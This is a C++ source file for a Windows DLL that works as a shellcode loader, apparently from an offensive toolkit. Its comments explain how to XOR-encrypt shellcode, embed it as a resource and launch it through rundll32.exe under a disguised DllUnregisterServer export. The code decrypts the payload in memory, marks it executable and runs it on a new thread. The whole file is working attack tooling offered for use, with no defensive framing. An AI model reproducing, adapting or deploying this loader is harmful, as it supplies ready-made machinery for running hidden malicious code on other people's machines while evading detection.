/***
*  DLL to be loaded using rundll32.exe
*  Howto:
*    - Encode shellcode bin file using shellcode-loaders\Tools\xor_encrypt.py
*    - Add the encrypted bin file as resource
*    - Change XOR_KEY constant to your xor key
*    - Run with `rundll32.exe mydll.dll,DllUnregisterServer
***/

#include "pch.h"
#include "resource.h"
#include <windows.h>

HMODULE hDll = NULL;

#if defined(_WIN64)
#pragma comment(linker, "/EXPORT:DllUnregisterServer")
#else
#pragma comment(linker, "/EXPORT:DllUnregisterServer=_DllUnregisterServer@16")
#endif

extern "C" void __stdcall DllUnregisterServer(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {

    // MessageBoxA(NULL, "|+| DllUnregisterServer started!", "Debug", MB_OK);

    HRSRC hRes = FindResource(hDll, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);

    if (hRes == NULL) {
        // char errDesc[128];
        // // wsprintfA(errDesc, "|!| FindResource failed with code: %d", GetLastError());
        // // MessageBoxA(NULL, errDesc, "Debug", MB_OK);
        return;
    }

    HGLOBAL hData = LoadResource(hDll, hRes);
    if (!hData) {
        // MessageBoxA(NULL, "|!| LoadResource failed", "Debug", MB_OK);
        return;
    }

    void* pPayload = LockResource(hData);
    DWORD dwSize = SizeofResource(hDll, hRes);

    char sizeMsg[64];
    // wsprintfA(sizeMsg, "|+| BIN file locked, size: %d bytes", dwSize);
    // MessageBoxA(NULL, sizeMsg, "Debug", MB_OK);

    void* exec_mem = VirtualAlloc(NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!exec_mem) return;

    RtlMoveMemory(exec_mem, pPayload, dwSize);

    // XOR Key, change this
    const char key[] = "xhorrox";
    size_t keyLen = sizeof(key) - 1;
    char* pMemory = (char*)exec_mem;
    for (DWORD i = 0; i < dwSize; i++) {
        pMemory[i] = pMemory[i] ^ key[i % keyLen];
    }

    DWORD oldProtect;
    VirtualProtect(exec_mem, dwSize, PAGE_EXECUTE_READ, &oldProtect);

    // MessageBoxA(NULL, "3. About to Execute Shellcode", "Debug", MB_OK);

    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);

    if (hThread) {
        WaitForSingleObject(hThread, INFINITE);
    }
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        // Here we need to get the handle for our DLL to be able to load the resource, otherwise it fails. Trust me on this.
        hDll = hModule;
        break;
    }
    return TRUE;
}